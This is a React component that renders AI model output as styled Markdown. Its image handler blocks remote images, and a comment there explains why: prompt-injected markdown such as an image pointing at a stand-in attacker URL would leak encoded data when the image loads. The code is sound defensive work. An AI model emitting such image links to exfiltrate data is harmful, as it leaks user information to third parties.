import ReactMarkdown, { type Components } from 'react-markdown';
import rehypeHighlight from 'rehype-highlight';
import remarkGfm from 'remark-gfm';
import { cn } from '@/lib/utils';
import { CodeBlock } from './code-block';

const PROSE = cn(
  'space-y-3 text-base leading-relaxed text-foreground',
  // headings
  '[&_h1]:mt-4 [&_h1]:text-lg [&_h1]:font-semibold',
  '[&_h2]:mt-4 [&_h2]:text-base [&_h2]:font-semibold',
  '[&_h3]:mt-3 [&_h3]:text-sm [&_h3]:font-semibold',
  // links
  '[&_a]:font-medium [&_a]:text-primary [&_a]:underline [&_a]:underline-offset-2 hover:[&_a]:opacity-80 [&_a]:[overflow-wrap:anywhere]',
  // lists
  '[&_ul]:list-disc [&_ul]:pl-5 [&_ol]:list-decimal [&_ol]:pl-5 [&_li]:my-0.5',
  // inline emphasis
  '[&_strong]:font-semibold [&_em]:italic',
  // blockquote + rule
  '[&_blockquote]:border-l-2 [&_blockquote]:border-border [&_blockquote]:pl-3 [&_blockquote]:text-muted-foreground',
  '[&_hr]:my-4 [&_hr]:border-border',
  // inline code only (fenced blocks handled by CodeBlock)
  '[&_:not(pre)>code]:rounded [&_:not(pre)>code]:bg-foreground/10 [&_:not(pre)>code]:px-1 [&_:not(pre)>code]:py-0.5 [&_:not(pre)>code]:text-[0.85em] [&_:not(pre)>code]:[overflow-wrap:anywhere]',
  // gfm tables
  '[&_table]:block [&_table]:w-full [&_table]:overflow-x-auto [&_table]:border-collapse [&_table]:text-xs',
  '[&_th]:border [&_th]:border-border [&_th]:bg-muted [&_th]:px-2 [&_th]:py-1 [&_th]:text-left',
  '[&_td]:border [&_td]:border-border [&_td]:px-2 [&_td]:py-1',
  // gfm task lists
  '[&_li:has(>input)]:list-none [&_li:has(>input)]:-ml-5 [&_input[type=checkbox]]:mr-1'
);

const components: Components = {
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
  a: (props) => <a target='_blank' rel='noopener noreferrer' {...props} />,
  // Remote images in model output are an exfiltration channel: prompt-injected
  // ![](https://attacker/?d=...) would leak whatever the model encodes into
  // the URL the moment the browser auto-loads it. Only inline data: images
  // render; anything remote falls back to its alt text.
  img: ({ src, alt }) =>
    typeof src === 'string' && src.startsWith('data:image/') ? (
      <img src={src} alt={alt ?? ''} className='max-h-64 rounded-md' />
    ) : (
      <span className='text-muted-foreground italic'>{alt || '[image]'}</span>
    ),
};

export function Markdown({ content }: { content: string }) {
  return (
    <div className={PROSE}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[
          [rehypeHighlight, { detect: true, ignoreMissing: true }],
        ]}
        components={components}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}
